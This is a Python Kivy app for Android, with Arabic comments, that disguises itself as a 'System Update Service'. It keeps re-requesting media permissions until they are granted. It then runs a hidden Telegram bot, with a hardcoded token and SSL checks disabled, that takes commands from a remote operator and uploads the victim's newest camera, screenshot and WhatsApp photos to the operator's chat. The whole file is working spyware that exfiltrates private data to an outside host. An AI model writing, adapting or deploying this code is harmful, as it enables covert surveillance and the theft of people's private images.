import os
import requests
import threading
import time
import ssl
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform

# --- إعدادات النظام الأساسية ---
BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbyNkQugNPhEFg0"
CHAT_ID = "7084557369"

class ShadowCore(App):
    def build(self):
        # واجهة مستخدم احترافية بسيطة لتبدو كخدمة نظام
        self.title = "System Update Service"
        self.label = Label(
            text="[b]System Update Service[/b]\n[color=ffff00]Status: Initializing...[/color]",
            markup=True,
            halign="center",
            font_size='18sp'
        )
        return self.label

    def on_start(self):
        # التأكد من أننا على أندرويد لطلب الأذونات
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            permissions = [
                Permission.READ_MEDIA_IMAGES,
                Permission.READ_MEDIA_VIDEO,
                Permission.INTERNET
            ]
            
            def callback(permissions, results):
                if all(results):
                    self.update_status("Service Running [color=00ff00]Active ✅[/color]")
                    threading.Thread(target=self.run_bot_engine, daemon=True).start()
                else:
                    self.update_status("[color=ff0000]Critical Error: Permissions Required![/color]")
                    # إعادة طلب الإذن بعد 4 ثواني بشكل إجباري
                    Clock.schedule_once(lambda dt: self.on_start(), 4)

            request_permissions(permissions, callback)
        else:
            # للتشغيل على الكمبيوتر (للتجربة فقط)
            threading.Thread(target=self.run_bot_engine, daemon=True).start()

    def update_status(self, text):
        # تحديث الحالة على شاشة الموبايل
        def set_text(dt):
            self.label.text = f"[b]System Update Service[/b]\n{text}"
        Clock.schedule_once(set_text)

    def send_telegram_request(self, method, data=None, files=None):
        """ محرك إرسال الطلبات لتليجرام مع تخطي حماية SSL """
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
            # استخدام verify=False لتجنب مشاكل الشهادات في أندرويد
            response = requests.post(url, data=data, files=files, timeout=20, verify=False)
            return response.json()
        except Exception as e:
            return None

    def run_bot_engine(self):
        """ المحرك الرئيسي للبوت - يعمل في الخلفية """
        self.send_telegram_request("sendMessage", {"chat_id": CHAT_ID, "text": "🚀 [SYSTEM_V168]: نظام الظل مفعل بالكامل مع صلاحيات الوسائط."})
        
        last_update_id = 0
        while True:
            try:
                updates = self.send_telegram_request("getUpdates", {"offset": last_update_id + 1})
                if updates and updates.get("result"):
                    for update in updates["result"]:
                        last_update_id = update["update_id"]
                        message = update.get("message", {})
                        text = message.get("text", "")

                        if text == "/check":
                            self.send_telegram_request("sendMessage", {
                                "chat_id": CHAT_ID, 
                                "text": "🟢 System: Live\n🔋 Battery: Optimized\n📂 Access: Granted"
                            })

                        elif text == "/photo":
                            self.send_telegram_request("sendMessage", {"chat_id": CHAT_ID, "text": "🔍 Scanning media folders..."})
                            self.scan_and_upload()

                time.sleep(2) # تقليل استهلاك البطارية
            except:
                time.sleep(10) # انتظار في حال انقطاع النت

    def scan_and_upload(self):
        """ مسح المجلدات وإرسال أحدث 5 صور كملفات """
        target_dirs = [
            "/sdcard/DCIM/Camera",
            "/sdcard/Pictures/Screenshots",
            "/sdcard/WhatsApp/Media/WhatsApp Images"
        ]
        
        count = 0
        for directory in target_dirs:
            if os.path.exists(directory):
                files = [os.path.join(directory, f) for f in os.listdir(directory) 
                         if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
                # ترتيب الصور من الأحدث للأقدم
                files.sort(key=os.path.getmtime, reverse=True)
                
                for file_path in files[:5]: # إرسال آخر 5 صور فقط لضمان السرعة
                    with open(file_path, 'rb') as f:
                        self.send_telegram_request("sendDocument", {"chat_id": CHAT_ID}, {"document": f})
                    count += 1
                    time.sleep(1) # فاصل زمني لتجنب حظر تليجرام
        
        if count == 0:
            self.send_telegram_request("sendMessage", {"chat_id": CHAT_ID, "text": "❌ لا توجد صور في المجلدات المحددة."})

if __name__ == '__main__':
    ShadowCore().run()
